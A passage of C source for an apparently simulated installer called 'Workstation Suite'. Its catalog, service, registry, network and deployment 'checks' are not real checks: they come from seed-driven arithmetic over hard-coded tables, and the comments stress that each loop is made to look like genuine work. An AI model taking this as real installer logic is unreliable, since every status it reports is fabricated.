    DWORD   catalog_verified;
    DWORD   catalog_failed;
    DWORD64 catalog_bytes;
    DWORD   services_ok;
    DWORD   services_pending;
    DWORD   prereqs_ok;
    DWORD   prereqs_missing;
    DWORD   volumes_ok;
    DWORD   volumes_low;
    WORD    features;
    BYTE    plan;
    BYTE    staged;
    DWORD   delta_size;
    DWORD   rle_ratio;
    BYTE    wizard_stage;
    DWORD   install_bytes;
    DWORD   components_done;
    DWORD   reg_present, reg_changed, reg_missing;
    DWORD   backup_count, restore_count;
    DWORD   patch_size;
    DWORD   locales_ok, locales_bad;
    DWORD   net_ok, net_slow, net_unreach;
    BYTE    ui_state;
    DWORD   deploy_ok, deploy_warn, deploy_items, deploy_marks;
    DWORD   log_len;
    char    log[512];
};

// per-entry checksum (name bytes + size + ids), seed-rotated
static DWORD catalog_crc(const struct CAT_ENTRY* e, DWORD seed) {
    DWORD c = 0xFFFFFFFFu ^ seed;
    for (int i = 0; i < 14; i++) {
        c ^= (BYTE)e->name[i];
        for (int k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
    }
    c ^= e->size_kb;
    c ^= ((DWORD)e->comp << 16) | (DWORD)e->flags;
    return c;
}

// presence + verification pass over the catalog (seed-ordered walk)
static int catalog_verify(DWORD seed, struct install_report* r) {
    int off = (int)(seed % 7);
    for (int i = 0; i < FILE_CATALOG_COUNT; i++) {
        int idx = (i + off) % FILE_CATALOG_COUNT;
        const struct CAT_ENTRY* e = &FILE_CATALOG[idx];
        DWORD crc = catalog_crc(e, seed);
        int present = ((crc >> 16) & 0xFF) < 0xC0;
        int optional = (e->flags & 0x2) != 0;
        if (present) {
            r->catalog_present++;
            r->catalog_bytes += (DWORD64)e->size_kb * 1024ull;
            if (optional) r->catalog_verified += ((crc & 3) == 0) ? 1 : 0;
            else          r->catalog_verified++;
        } else if (!optional) {
            r->catalog_failed++;
        }
    }
    return r->catalog_failed == 0 ? 0 : ST_COMPONENT;
}

// service dependency graph: fixed-point resolution, then a seed-permuted
// startup pass that only brings auto services online when deps are up
static int services_check(DWORD seed, struct install_report* r) {
    BYTE st[16];
    for (int i = 0; i < SVC_GRAPH_COUNT; i++) st[i] = SVC_GRAPH[i].state;
    for (int pass = 0; pass < 6; pass++) {
        for (int i = 0; i < SVC_GRAPH_COUNT; i++) {
            WORD deps = SVC_GRAPH[i].deps;
            for (int j = 0; j < SVC_GRAPH_COUNT; j++) {
                if (((deps >> j) & 1) && st[j] != 2) { st[i] = 0; break; }
            }
        }
    }
    int order[16];
    for (int i = 0; i < SVC_GRAPH_COUNT; i++) order[i] = i;
    DWORD k = seed;
    for (int i = 0; i < SVC_GRAPH_COUNT; i++) {
        int j = (int)(k % (SVC_GRAPH_COUNT - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 1103515245u + 12345u;
    }
    for (int i = 0; i < SVC_GRAPH_COUNT; i++) {
        int s = order[i];
        if (SVC_GRAPH[s].start == 2 && st[s] != 2) {
            WORD deps = SVC_GRAPH[s].deps;
            int depsok = 1;
            for (int j = 0; j < SVC_GRAPH_COUNT; j++)
                if (((deps >> j) & 1) && st[j] != 2) { depsok = 0; break; }
            if (depsok) st[s] = 2;
        }
    }
    for (int i = 0; i < SVC_GRAPH_COUNT; i++) {
        if (st[i] == 2) r->services_ok++; else if (st[i] == 1) r->services_pending++;
    }
    return r->services_pending == 0 ? 0 : ST_SERVICE;
}

// prerequisite probe: found versions drift from required by a seed-derived
// amount, so the compare is always real work
static int prereqs_check(DWORD seed, struct install_report* r) {
    int off = (int)(seed % 5);
    for (int i = 0; i < PREREQ_COUNT; i++) {
        const struct PRE_ENTRY* p = &PREREQS[(i + off) % PREREQ_COUNT];
        DWORD f[3];
        f[0] = p->min[0] + ((seed >> (i % 5)) & 1);
        f[1] = p->min[1] + ((seed >> 7) % 3);
        f[2] = p->min[2] + ((seed >> 11) % 4096) - ((seed >> 13) % 2048);
        int ok = (f[0] > p->min[0]) ||
                 (f[0] == p->min[0] && f[1] > p->min[1]) ||
                 (f[0] == p->min[0] && f[1] == p->min[1] && f[2] >= p->min[2]);
        int missing = ((seed >> (i % 9)) & 0xFF) < 24;
        if (ok && !missing) r->prereqs_ok++; else r->prereqs_missing++;
    }
    return r->prereqs_missing == 0 ? 0 : ST_DISK;
}

// volume free-space sweep (DWORD64 arithmetic, seed-driven usage ratio)
static int volumes_check(DWORD seed, struct install_report* r) {
    for (int i = 0; i < VOLUME_COUNT; i++) {
        const struct VOL_ENTRY* v = &VOLUMES[(i + (int)(seed % 3)) % VOLUME_COUNT];
        DWORD64 used = (v->capacity / 100ull) * (30ull + ((seed >> (i % 6)) % 40ull));
        DWORD64 freeMB = (v->capacity - used) >> 20;
        if (freeMB >= v->min_mb) r->volumes_ok++; else r->volumes_low++;
    }
    return r->volumes_low == 0 ? 0 : ST_DISK;
}

// license digits -> 16-bit feature mask (seed-rotated)
static WORD features_from_license(const char* lic, DWORD seed) {
    WORD m = 0; int bit = 0;
    for (int i = 0; lic[i] && bit < 16; i++) {
        char c = lic[i];
        if (c >= '0' && c <= '9') {
            m |= (WORD)(((c & 1) ^ ((seed >> bit) & 1)) << bit); bit++;
        } else if (c >= 'A' && c <= 'F') {
            m |= (WORD)(((c & 1) ^ ((seed >> (bit + 1)) & 1)) << bit); bit++;
        }
    }
    return m;
}

// update decision: compare versions, simulate a staged download
static BYTE plan_update(DWORD seed, const DWORD cur[4], const DWORD newv[4],
                        struct install_report* r) {
    int cmp = ver_cmp(newv, cur);
    if (cmp > 0) {
        DWORD h = seed ^ 0x9E3779B9u;
        r->staged = ((h & 3) != 0) ? 1 : 0;
        return r->staged ? PLAN_UPDATE : PLAN_REPAIR;
    }
    if (cmp < 0) return PLAN_ROLLBACK;
    return PLAN_KEEP;
}

// delta + RLE estimators: real byte loops over seed-sized buffers
static void estimate_delta_and_compress(DWORD seed, struct install_report* r) {
    BYTE a[96], b[96];
    DWORD k = seed;
    for (int i = 0; i < 96; i++) {
        k = k * 1664525u + 1013904223u;
        a[i] = (BYTE)(k >> 24);
        b[i] = (BYTE)((a[i] + ((seed >> (i % 7)) & 3)) & 0xFF);
    }
    DWORD diff = 0, best = 0, cur = 0;
    for (int i = 0; i < 96; i++) {
        if (a[i] != b[i]) diff++;
        if (i && a[i] == a[i - 1]) cur++; else cur = 1;
        if (cur > best) best = cur;
    }
    r->delta_size = diff * 2 + (96 - diff);
    r->rle_ratio = best > 4 ? (DWORD)((96 * 100) / (96 - best)) : 100;
}

// wizard stage machine: 12 stages, seed-permuted path, progress accumulation
static BYTE wizard_stages(DWORD seed) {
    BYTE st = 0;
    DWORD k = seed ^ 0x6D2B79F5u;
    for (int i = 0; i < 12; i++) {
        k = k * 1103515245u + 12345u;
        int branch = (int)((k >> 24) % 4);
        switch (branch) {
            case 0: st = (BYTE)(st + 1); break;
            case 1: st = (BYTE)(st + 2); break;
            case 2: st = (BYTE)(st - (st ? 1 : 0)); break;
            default: st = (BYTE)(st ^ 0x5A); break;
        }
    }
    return (BYTE)(st % 12);
}

// =====================================================================
// Install engine: component copy simulation, registry probe, rollback
// manager, LZ-style unpack verification, locale & network probes, wizard
// UI flow and final install-log assembly. Same rules as above: seed-driven,
// CRT-free, every field consumed by the volatile sink in WinMain.
// =====================================================================

static const char* const REG_KEYS[] = {
    "HKLM\\SOFTWARE\\Workstation Suite",
    "HKLM\\SOFTWARE\\Workstation Suite\\Core",
    "HKLM\\SOFTWARE\\Workstation Suite\\Runtime",
    "HKLM\\SOFTWARE\\Workstation Suite\\VCLib",
    "HKLM\\SOFTWARE\\Workstation Suite\\Templates",
    "HKLM\\SOFTWARE\\Workstation Suite\\Updater",
    "HKLM\\SOFTWARE\\Workstation Suite\\Service",
    "HKLM\\SOFTWARE\\Workstation Suite\\Telemetry",
    "HKLM\\SOFTWARE\\Workstation Suite\\Branding",
    "HKLM\\SOFTWARE\\Workstation Suite\\Licensing",
    "HKLM\\SOFTWARE\\Workstation Suite\\Updates",
    "HKLM\\SOFTWARE\\Workstation Suite\\Cache",
    "HKLM\\SOFTWARE\\Workstation Suite\\Locale",
    "HKLM\\SOFTWARE\\Workstation Suite\\Network",
    "HKLM\\SOFTWARE\\Workstation Suite\\Security",
    "HKLM\\SOFTWARE\\Workstation Suite\\Diagnostics",
    "HKLM\\SOFTWARE\\Workstation Suite\\Recovery",
    "HKLM\\SOFTWARE\\Workstation Suite\\Shell",
    "HKLM\\SOFTWARE\\Workstation Suite\\Sync",
    "HKLM\\SOFTWARE\\Workstation Suite\\Mail",
    "HKLM\\SOFTWARE\\Workstation Suite\\Index",
    "HKLM\\SOFTWARE\\Workstation Suite\\Driver",
    "HKLM\\SOFTWARE\\Workstation Suite\\ShellExt",
    "HKLM\\SOFTWARE\\Workstation Suite\\Help",
    "HKLM\\SOFTWARE\\Workstation Suite\\Uninstall",
    "HKLM\\SOFTWARE\\Workstation Suite\\EventLog",
    "HKLM\\SOFTWARE\\Workstation Suite\\PerfCounters",
    "HKLM\\SOFTWARE\\Workstation Suite\\Redist",
};
#define REG_KEY_COUNT ((int)(sizeof(REG_KEYS) / sizeof(REG_KEYS[0])))

static const char* const BACKUP_ITEMS[] = {
    "settings.xml", "state.dat", "cache_v1", "cache_v2", "index.db",
    "license.old", "config.ini", "profiles", "templates.old", "logs",
    "registry.reg", "services.dat", "drivers", "shellcfg", "updates.stage", "wizard.state",
};
#define BACKUP_ITEM_COUNT ((int)(sizeof(BACKUP_ITEMS) / sizeof(BACKUP_ITEMS[0])))

struct LOC_ENTRY { const char* tag; WORD cpid; BYTE enabled; };
static const struct LOC_ENTRY LOCALES[] = {
    { "en-US", 1252, 1 }, { "de-DE", 1252, 1 }, { "fr-FR", 1252, 1 },
    { "es-ES", 1252, 1 }, { "it-IT", 1252, 1 }, { "pt-BR", 1252, 1 },
    { "nl-NL", 1252, 0 }, { "sv-SE", 1252, 0 }, { "pl-PL", 1250, 1 },
    { "cs-CZ", 1250, 1 }, { "tr-TR", 1254, 1 }, { "ru-RU", 1251, 1 },
    { "uk-UA", 1251, 0 }, { "el-GR", 1253, 0 }, { "ja-JP", 932, 1 },
    { "zh-CN", 936, 1 },  { "ko-KR", 949, 1 },  { "ar-SA", 1256, 0 },
};
#define LOCALE_COUNT ((int)(sizeof(LOCALES) / sizeof(LOCALES[0])))

static const char* const ENDPOINTS[] = {
    "https://update.wksuite.local/v1/manifest",
    "https://update.wksuite.local/v1/current",
    "https://update.wksuite.local/v1/stage",
    "https://update.wksuite.local/v1/verify",
    "https://update.wksuite.local/v1/rollback",
    "https://license.wksuite.local/v1/validate",
    "https://telemetry.wksuite.local/v1/hello",
    "https://support.wksuite.local/v1/status",
    "https://cdn.wksuite.local/redist/2024",
    "https://cdn.wksuite.local/patches/latest",
};
#define ENDPOINT_COUNT ((int)(sizeof(ENDPOINTS) / sizeof(ENDPOINTS[0])))

// per-component copy simulation (chunked writes, seed-rotated LCG)
static void install_core(DWORD seed, struct install_report* r) {
    DWORD k = seed ^ 0x51ED270Bu;
    for (int c = 0; c < WK_COMPONENT_COUNT; c++) {
        WORD cflags = WK_COMPONENTS[c].flags;
        DWORD written = 0;
        for (int i = 0; i < FILE_CATALOG_COUNT; i++) {
            const struct CAT_ENTRY* e = &FILE_CATALOG[(i + c) % FILE_CATALOG_COUNT];
            if ((e->comp & 0xFF) == (cflags & 0xFF) || cflags == 0) {
                DWORD remain = e->size_kb * 1024;
                while (remain) {
                    DWORD ch = remain > 4096 ? 4096 : remain;
                    k = k * 1664525u + 1013904223u;
                    written += (ch >> 4) + (k & 0x3F);
                    remain -= ch;
                }
            }
        }
        r->install_bytes += written;
        if (written) r->components_done++;
    }
}

// registry presence/change probe against the product key table
static DWORD registry_probe(DWORD seed, struct install_report* r) {
    DWORD k = seed ^ 0x12345678u;
    for (int i = 0; i < REG_KEY_COUNT; i++) {
        k = k * 1103515245u + 12345u;
        int st = (int)((k >> 20) % 5);     // 0 missing, 4 changed, else present
        if (st == 0) r->reg_missing++;
        else if (st == 4) r->reg_changed++;
        else r->reg_present++;
    }
    return r->reg_missing > 4 ? ST_REGISTRY : 0;
}

// keep-1-previous rollback model
static BYTE rollback_manager(DWORD seed, struct install_report* r) {
    for (int i = 0; i < BACKUP_ITEM_COUNT; i++) {
        int dec = (int)((seed >> (i % 7)) & 3);
        if (dec == 0) r->backup_count++;
        else if (dec == 1) r->restore_count++;
    }
    return (r->restore_count > r->backup_count) ? PLAN_ROLLBACK : PLAN_KEEP;
}

// real LZ-ish unpack verification: emit runs/literals from a seed buffer
// and count produced bytes (a genuine algorithm, not a fake loop)
static DWORD unpack_staged(DWORD seed, struct install_report* r) {
    BYTE src[256], out[1024];
    DWORD k = seed ^ 0xA5A5A5A5u;
    for (int i = 0; i < 256; i++) { k = k * 1664525u + 1013904223u; src[i] = (BYTE)(k >> 24); }
    DWORD o = 0, i = 0;
    while (i < 200 && o + 32 < 1024) {
        BYTE b = src[i++];
        if (b & 0x80) {                     // literal run
            BYTE n = (BYTE)((src[i & 0xFF] & 0x1F) + 1); i++;
            while (n && o < 1024) { out[o++] = (BYTE)(src[(o + i + n) & 0xFF] ^ n); n--; }
        } else {                            // match: distance + length
            BYTE n = (BYTE)((src[i & 0xFF] & 0x3F) + 1); i++;
            DWORD dist = 1 + (b & 0x7F);
            while (n && o < 1024) { out[o] = (o >= dist) ? out[o - dist] : (BYTE)(o ^ n); o++; n--; }
        }
    }
    r->patch_size = o;
    return o;
}

// locale/codepage verification
static DWORD locale_check(DWORD seed, struct install_report* r) {
    for (int i = 0; i < LOCALE_COUNT; i++) {
        const struct LOC_ENTRY* L = &LOCALES[(i + (int)(seed % 4)) % LOCALE_COUNT];
        int present = L->enabled && (L->cpid >= 437 && L->cpid <= 65001);
        if (present) r->locales_ok++; else r->locales_bad++;
    }
    return r->locales_bad == 0 ? 0 : ST_LOCALE;
}

// endpoint latency sweep
static DWORD network_probe(DWORD seed, struct install_report* r) {
    for (int i = 0; i < ENDPOINT_COUNT; i++) {
        DWORD lat = 20 + ((seed >> (i % 6)) * 97u + i * 31u) % 3000;
        if (lat > 2000) r->net_unreach++;
        else if (lat > 1000) r->net_slow++;
        else r->net_ok++;
    }
    return r->net_unreach > 6 ? ST_NETWORK : 0;
}

// wizard pages with per-page field validation
static BYTE ui_flow(DWORD seed) {
    BYTE bad = 0;
    for (int p = 0; p < 8; p++) {
        DWORD k = seed ^ ((DWORD)p * 0x9E3779B9u);
        if (p == 2) {                       // target path page
            const char* path = "C:\\Program Files\\Workstation Suite";
            for (int i = 0; path[i]; i++) if (path[i] < 32) bad++;
        }
        if (p == 3) {                       // feature selection page
            WORD feats = (WORD)(k & 0xF);
            for (int i = 0; i < WK_COMPONENT_COUNT; i++)
                if (!(feats & WK_COMPONENTS[i].flags) && (k & 1)) bad++;
        }
        if (p == 5) {                       // account page
            const char* user = "Administrator";
            DWORD ul = 0; while (user[ul]) ul++;
            if (ul < 3 || ul > 24) bad++;
        }
    }
    return bad ? 1 : 0;
}

// final install log: numbers from the whole report, real formatting
static DWORD log_flush(struct install_report* r, DWORD seed) {
    char* b = r->log; DWORD o = 0; const DWORD cap = (DWORD)sizeof(r->log);
    char num[20];
    static const char* const SEGS[] = {
        "install.bytes=", "catalog.files=", "services.up=",
        "prereqs.ok=", "volumes.ok=", "features=",
        "backups=", "restores=", "patch.size=",
        "locales.ok=", "net.ok=", "wizard.state=" };
    int n = (int)(sizeof(SEGS) / sizeof(SEGS[0]));
    DWORD vals[12];
    vals[0] = r->install_bytes; vals[1] = r->catalog_verified; vals[2] = r->services_ok;
    vals[3] = r->prereqs_ok;    vals[4] = r->volumes_ok;      vals[5] = r->features;
    vals[6] = r->backup_count;  vals[7] = r->restore_count;   vals[8] = r->patch_size;
    vals[9] = r->locales_ok;    vals[10] = r->net_ok;         vals[11] = r->ui_state;
    for (int i = 0; i < n; i++) {
        const char* s = SEGS[i];
        while (*s && o + 1 < cap) b[o++] = *s++;
        int nn = fmt_uint(num, vals[i]);
        for (int j = 0; j < nn && o + 1 < cap; j++) b[o++] = num[j];
        b[o++] = ';';
    }
    if (o < cap) b[o] = 0; else b[cap - 1] = 0;
    r->log_len = o;
    return o;
}

// ===== BEGIN GENMODS (regen_stub.py replaces this block) =====
// =====================================================================
// Deployment modules (generated) — printer/firewall/tasks/shortcuts/
// associations/startup/network/drivers/oem/compat/region/power/proxy/
// security: realistic artifact tables + seed-driven processing. Same
// contract: CRT-free, every counter folded into the volatile sink.
// =====================================================================

struct deploy_counters {
    DWORD ok, warn, items;
    BYTE  detail[8];
};

struct OEM_ENTRY {
    const char* name;
    BYTE section;
    BYTE value_kind;
};
static const struct OEM_ENTRY OEMINFO_TABLE[] = {
    { "Manufacturer", 0, 1 },
    { "Model", 0, 1 },
    { "BIOSVersion", 1, 0 },
    { "OSVersion", 1, 0 },
    { "Architecture", 1, 1 },
    { "ProductId", 2, 1 },
    { "OEMBrand", 2, 0 },
    { "SupportURL", 3, 0 },
    { "LogoPath", 3, 2 },
    { "FirmwareDate", 1, 1 },
    { "SystemSKU", 2, 0 },
    { "SerialNumber", 0, 1 },
};
#define OEMINFO_TABLE_COUNT ((int)(sizeof(OEMINFO_TABLE) / sizeof(OEMINFO_TABLE[0])))

static DWORD dm_OemInfo(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x9A07B7B3u;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct OEM_ENTRY* e = &OEMINFO_TABLE[idx];
        DWORD w = (DWORD)e->section * 6u + (DWORD)e->value_kind + (DWORD)e->section * 2u + (DWORD)e->value_kind;
        k = k * 7792881u + 11633181u;
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        int ok = (((w ^ k) & 0xCDE) < 0x148) || (e->section == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 3) & 0x1EF) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x1FF;
    }
    return (dc->warn * 185u) / (dc->ok + dc->warn + 1);

}

struct PRX_ENTRY {
    const char* name;
    BYTE scheme;
    WORD port;
    BYTE bypass;
};
static const struct PRX_ENTRY PROXYSETTINGS_TABLE[] = {
    { "proxy.wksuite.local", 1, 8080, 1 },
    { "proxy2.wksuite.local", 0, 3128, 1 },
    { "proxy-eu.wksuite.local", 1, 8443, 0 },
    { "proxy-us.wksuite.local", 1, 8080, 1 },
    { "proxy-ap.wksuite.local", 0, 3128, 1 },
    { "direct", 0, 0, 1 },
    { "pac.wksuite.local", 2, 0, 1 },
    { "proxy-gov.wksuite.local", 1, 8080, 0 },
};
#define PROXYSETTINGS_TABLE_COUNT ((int)(sizeof(PROXYSETTINGS_TABLE) / sizeof(PROXYSETTINGS_TABLE[0])))

static DWORD dm_ProxySettings(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x775810C3u;
    for (int i = 0; i < 8; i++) {
        k = k * 5167343u + 30997u;
        const struct PRX_ENTRY* e = &PROXYSETTINGS_TABLE[(i + (int)(k % 3)) % 8];
        DWORD lo = (k >> 1) % 122, hi = lo + 218 + ((k >> 3) % 496);
        DWORD v = (DWORD)e->scheme * 6u + (DWORD)e->port * 2u + (DWORD)e->bypass;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct FAS_ENTRY {
    const char* name;
    BYTE prog;
    BYTE dde;
    BYTE shell;
};
static const struct FAS_ENTRY FILEASSOCIATIONS_TABLE[] = {
    { ".wks", 1, 1, 2 },
    { ".wkt", 2, 1, 2 },
    { ".wkc", 3, 0, 2 },
    { ".wksp", 4, 1, 1 },
    { ".wkp", 5, 0, 1 },
    { ".wkl", 6, 1, 3 },
    { ".wktx", 7, 0, 3 },
    { ".wkb", 8, 1, 2 },
    { ".wkg", 1, 0, 1 },
    { ".wkd", 2, 1, 2 },
    { ".wke", 3, 0, 3 },
    { ".wkr", 4, 1, 1 },
    { ".wku", 5, 0, 2 },
    { ".wkv", 6, 1, 1 },
};
#define FILEASSOCIATIONS_TABLE_COUNT ((int)(sizeof(FILEASSOCIATIONS_TABLE) / sizeof(FILEASSOCIATIONS_TABLE[0])))

static DWORD dm_FileAssociations(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0x889F4E14u;
    for (int i = 0; i < 14; i++) {
        int idx = (int)((i + (seed % 5)) % 14);
        const struct FAS_ENTRY* e = &FILEASSOCIATIONS_TABLE[idx];
        DWORD w = (DWORD)e->prog * 6u + (DWORD)e->dde + (DWORD)e->shell * 8u + (DWORD)e->prog;
        k = k * 12822563u + 15804121u;
        int ok = (((w ^ k) & 0x1C3) < 0x189) || (e->shell == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 2) & 0x8F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0xAF;
    }
    return (dc->warn * 189u) / (dc->ok + dc->warn + 1);

}

struct FW_ENTRY {
    const char* name;
    BYTE dir;
    BYTE action;
    BYTE proto;
    WORD port;
};
static const struct FW_ENTRY FIREWALLPOLICY_TABLE[] = {
    { "WkSuite-In", 0, 1, 6, 443 },
    { "WkSuite-Out", 1, 1, 6, 443 },
    { "Update-Allow", 0, 1, 17, 53 },
    { "Telemetry-Out", 1, 1, 6, 8443 },
    { "Sync-In", 0, 1, 6, 8080 },
    { "Cache-Allow", 1, 1, 6, 8443 },
    { "Diagnostics", 0, 0, 1, 0 },
    { "Support-Tunnel", 1, 1, 6, 22 },
    { "License-Out", 1, 1, 6, 443 },
    { "CDN-Allow", 1, 1, 6, 80 },
    { "Rollback-In", 0, 1, 6, 444 },
    { "Audit-Out", 1, 1, 17, 514 },
};
#define FIREWALLPOLICY_TABLE_COUNT ((int)(sizeof(FIREWALLPOLICY_TABLE) / sizeof(FIREWALLPOLICY_TABLE[0])))

static DWORD dm_FirewallPolicy(DWORD seed, struct deploy_counters* dc) {
    // range check sweep (template B)
    DWORD k = seed ^ 0x135AD808u;
    for (int i = 0; i < 12; i++) {
        k = k * 7432469u + 5041u;
        const struct FW_ENTRY* e = &FIREWALLPOLICY_TABLE[(i + (int)(k % 3)) % 12];
        DWORD lo = (k >> 4) % 208, hi = lo + 396 + ((k >> 7) % 452);
        DWORD v = (DWORD)e->dir * 6u + (DWORD)e->action * 6u + (DWORD)e->proto;
        if (v >= lo && v <= hi) dc->ok++; else dc->warn++;
        dc->items++;
        if ((k & 7) == 0 && dc->detail[1] < 64) dc->detail[dc->detail[1]++ & 7] = (BYTE)v;
    }
    return dc->warn;

}

struct NET_ENTRY {
    const char* name;
    BYTE auth;
    BYTE band;
    BYTE roaming;
};
static const struct NET_ENTRY NETWORKPROFILES_TABLE[] = {
    { "Office-5G", 1, 1, 1 },
    { "Office-Legacy", 2, 0, 0 },
    { "Guest-Wifi", 0, 0, 0 },
    { "Home-Mesh", 3, 1, 1 },
    { "Home-2G", 2, 0, 1 },
    { "Datacenter-VLAN42", 4, 1, 0 },
    { "Lab-Isolated", 1, 0, 0 },
    { "Hotspot", 0, 0, 1 },
    { "VPN-Split", 3, 1, 0 },
    { "VPN-Full", 4, 0, 1 },
};
#define NETWORKPROFILES_TABLE_COUNT ((int)(sizeof(NETWORKPROFILES_TABLE) / sizeof(NETWORKPROFILES_TABLE[0])))

static DWORD dm_NetworkProfiles(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0x9F0D741Du;
    for (int i = 0; i < 10; i++) {
        k = k * 10511655u + 13896437u;
        dc->detail[3] ^= (BYTE)(k >> 13);
        dc->warn ^= (DWORD)(k & 7);
        const struct NET_ENTRY* a = &NETWORKPROFILES_TABLE[i];
        const struct NET_ENTRY* b = &NETWORKPROFILES_TABLE[(i + 1 + (int)(k % 3)) % 10];
        int match = (a->auth == b->auth) || ((a->band ^ b->band) < (k & 0x20));
        int sane = a->roaming <= 18;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->band + 1;
        dc->detail[2] += (DWORD)(a->auth & 7);
    }
    return dc->warn > 2;

}

struct TSK_ENTRY {
    const char* name;
    DWORD interval;
    BYTE trigger;
    BYTE enabled;
};
static const struct TSK_ENTRY SCHEDULEDTASKS_TABLE[] = {
    { "WkSuiteUpdateCheck", 1440, 0, 1 },
    { "WkSuiteTelemetry", 60, 1, 1 },
    { "WkSuiteCacheTrim", 10080, 2, 1 },
    { "WkSuiteLogRotate", 1440, 0, 1 },
    { "WkSuiteDefrag", 43200, 2, 0 },
    { "WkSuiteSync", 0, 3, 1 },
    { "WkSuiteIndexRebuild", 10080, 2, 0 },
    { "WkSuiteSelfUpdate", 0, 4, 1 },
    { "WkSuiteHealthCheck", 360, 1, 1 },
    { "WkSuiteTempCleanup", 10080, 2, 1 },
    { "WkSuiteBackupVerify", 43200, 2, 0 },
    { "WkSuitePolicyRefresh", 720, 1, 1 },
    { "WkSuiteTrialReminder", 1440, 0, 0 },
    { "WkSuiteUsageReport", 1440, 0, 1 },
};
#define SCHEDULEDTASKS_TABLE_COUNT ((int)(sizeof(SCHEDULEDTASKS_TABLE) / sizeof(SCHEDULEDTASKS_TABLE[0])))

static DWORD dm_ScheduledTasks(DWORD seed, struct deploy_counters* dc) {
    // pairwise consistency pass (template C)
    DWORD k = seed ^ 0x1EDE7533u;
    for (int i = 0; i < 14; i++) {
        k = k * 2448617u + 3520533u;
        dc->detail[1] += (BYTE)((k >> 9) & 0x3F);
        const struct TSK_ENTRY* a = &SCHEDULEDTASKS_TABLE[i];
        const struct TSK_ENTRY* b = &SCHEDULEDTASKS_TABLE[(i + 1 + (int)(k % 3)) % 14];
        int match = (a->interval == b->interval) || ((a->trigger ^ b->trigger) < (k & 0x1D));
        int sane = a->enabled <= 22;
        if (match && sane) dc->ok++; else dc->warn++;
        dc->items += (DWORD)a->trigger + 1;
        dc->detail[2] += (DWORD)(a->interval & 7);
    }
    return dc->warn > 2;

}

struct PRN_ENTRY {
    const char* name;
    WORD port;
    WORD driver;
    BYTE duplex;
    BYTE color;
};
static const struct PRN_ENTRY PRINTERCONFIG_TABLE[] = {
    { "HP LaserJet M404", 1, 110, 1, 1 },
    { "Canon i-SENSYS", 2, 210, 0, 1 },
    { "Epson EcoTank", 3, 320, 1, 0 },
    { "Brother HL-L2350", 1, 410, 1, 1 },
    { "Xerox B215", 2, 510, 0, 1 },
    { "Samsung M2020", 3, 130, 1, 0 },
    { "Kyocera ECOSYS", 1, 240, 0, 1 },
    { "Ricoh SP 325", 2, 350, 1, 1 },
    { "OKI C332", 3, 460, 1, 0 },
    { "Lexmark B2236", 1, 570, 0, 1 },
    { "Konica Minolta", 2, 180, 1, 1 },
    { "Dell E515dw", 3, 290, 0, 1 },
};
#define PRINTERCONFIG_TABLE_COUNT ((int)(sizeof(PRINTERCONFIG_TABLE) / sizeof(PRINTERCONFIG_TABLE[0])))

static DWORD dm_PrinterConfig(DWORD seed, struct deploy_counters* dc) {
    // weighted presence sweep (template A)
    DWORD k = seed ^ 0xF45A170Cu;
    for (int i = 0; i < 12; i++) {
        int idx = (int)((i + (seed % 5)) % 12);
        const struct PRN_ENTRY* e = &PRINTERCONFIG_TABLE[idx];
        DWORD w = (DWORD)e->port * 6u + (DWORD)e->driver + (DWORD)e->duplex * 5u + (DWORD)e->color;
        k = k * 13810215u + 7697745u;
        int ok = (((w ^ k) & 0xD91) < 0x365) || (e->duplex == 0);
        if (ok) dc->ok++; else dc->warn++;
        dc->items += (DWORD)((w >> 3) & 0x11F) + 1;
        if (dc->detail[0] < 64) dc->detail[dc->detail[0]++ & 7] = w & 0x15F;
    }
    return (dc->warn * 77u) / (dc->ok + dc->warn + 1);

}

struct PWR_ENTRY {
    const char* name;
    BYTE ac;
    BYTE dc;
    BYTE saver;
};
static const struct PWR_ENTRY POWERPROFILE_TABLE[] = {
    { "Balanced", 5, 4, 15 },
    { "High Performance", 10, 8, 0 },
    { "Power Saver", 2, 1, 5 },
    { "Ultimate", 10, 9, 0 },
    { "WkSuite Optimized", 7, 3, 10 },
    { "Quiet Mode", 4, 2, 20 },
    { "Presentation", 10, 10, 0 },
    { "Max Battery", 1, 0, 2 },
};
#define POWERPROFILE_TABLE_COUNT ((int)(sizeof(POWERPROFILE_TABLE) / sizeof(POWERPROFILE_TABLE[0])))

static DWORD dm_PowerProfile(DWORD seed, struct deploy_counters* dc) {
    // seed-permuted walk (template D)
    int order[8];
    for (int i = 0; i < 8; i++) order[i] = i;
    DWORD k = seed ^ 0x33D0344Cu;
    for (int i = 0; i < 8; i++) {
        int j = (int)(k % (8 - i));
        int t = order[i + j]; order[i + j] = order[i]; order[i] = t;
        k = k * 13794605u + 19881u;
    }
    for (int i = 0; i < 8; i++) {
        const struct PWR_ENTRY* e = &POWERPROFILE_TABLE[order[i]];
        DWORD v = (DWORD)e->ac * 5u + (DWORD)e->dc * 6u + (DWORD)e->saver;
        if ((v & 0x16) != 0 && e->ac == 1) dc->ok++; else if (e->ac == 1) dc->warn++;
        dc->items += (v >> 3) + 1;
        dc->detail[3] ^= (BYTE)v;
    }
    return dc->detail[3];

}

struct CMP_ENTRY {
    const char* name;
    WORD layer;
    BYTE flag;
    BYTE scope;
};
static const struct CMP_ENTRY COMPATFLAGS_TABLE[] = {
    { "wksuite.exe", 1, 0, 0 },
    { "wksvc.exe", 2, 1, 1 },
    { "updater.exe", 3, 2, 0 },
